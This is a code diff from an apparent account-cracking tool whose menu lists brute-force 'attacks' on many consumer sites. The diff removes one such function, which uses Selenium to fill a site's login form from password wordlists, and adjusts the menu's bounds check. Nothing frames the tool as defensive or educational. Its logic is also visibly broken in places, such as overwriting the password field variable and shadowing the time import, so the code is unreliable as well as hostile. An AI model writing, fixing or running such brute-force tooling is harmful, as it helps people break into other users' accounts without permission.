@@ -10,6 +10,7 @@ try:
     import time
     import platform
     from os import system
+    from datetime import time
     import sniffer
     import socket
     import http
@@ -81,7 +82,6 @@ def AvailAttacks():
     print("[21] FIFA")
     print("[22] Zoom")
     print("[23] Pornhub")
-    print("[24] Xhamster")
 
 #Instagram
 def Instagram():
@@ -1333,61 +1333,6 @@ def Pornhub():
             continue
         else:
             continue
-
-#Xhamster
-def Xhamster():
-    time.sleep(1)
-    print("[+] Preparing Brute Force Attack for Xhamster...")
-    time.sleep(2)
-    umail=input("[::] Please enter the Username or the Email: ")
-    time.sleep(1)
-    while umail == None:
-        time.sleep(1)
-        print("[!] Invalid Username or Email !")
-        time.sleep(1)
-        umail=input("[::] Please enter again the Username or the Email: ")
-    print("[!] Initiating Attack !")
-    umail = umail.lower()
-    umail = umail.strip()
-    browser = webdriver.Firefox()
-    browser.get("https://xhamster.com/login")
-    username = browser.find_element_by_id("username")
-    password = browser.find_element_by_id("password")
-    login = browser.find_element_by_class_name("xh-button button full-width black large square")
-    login.click()
-    Found = False
-    for i in range(16):
-        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
-        f.seek(0)
-        lines=f.readlines()
-        for line in lines:
-            content=line[0:-1]
-            content=content.strip()
-            password = content
-            try:
-                username.send_keys(umail)
-                password.send_keys(password)
-            except Exception as e:
-                continue
-            if e == False:
-                time.sleep(1)
-                Found = True
-                print("[!] Password Found: "+str(Found))
-                time.sleep(1)
-                print("[+] Password: "+str(password))
-                exit(0)
-            else:
-                continue
-        if password not in "passwords"+str(i)+".txt":
-            time.sleep(1)
-            f.close()
-            print("[!] Password Found in File "+str(i)+": "+str(Found))
-            time.sleep(2)
-            print("[+] Continuing Brute Force with File "+str(i)+"...")
-            time.sleep(2)
-            continue
-        else:
-            continue
 #Main Program
 
 print("\n")
@@ -1414,7 +1359,7 @@ if option == "01" or option == "1":
     print("\n")
     attack = int(input("[::] Please enter the number of the attack: "))
     time.sleep(1)
-    while attack <= 0 or attack > 20:
+    while attack <= 0 or attack > 23 or attack == None:
         print("[!] Invalid Attack !")
         time.sleep(1)
         attack = int(input("[::] Please enter again the number of the attack: "))
@@ -1464,8 +1409,6 @@ if option == "01" or option == "1":
         Zoom()
     elif attack == 23:
         Pornhub()
-    elif attack == 24:
-        Xhamster()
 else:
     print("Exiting...")
     exit(0)
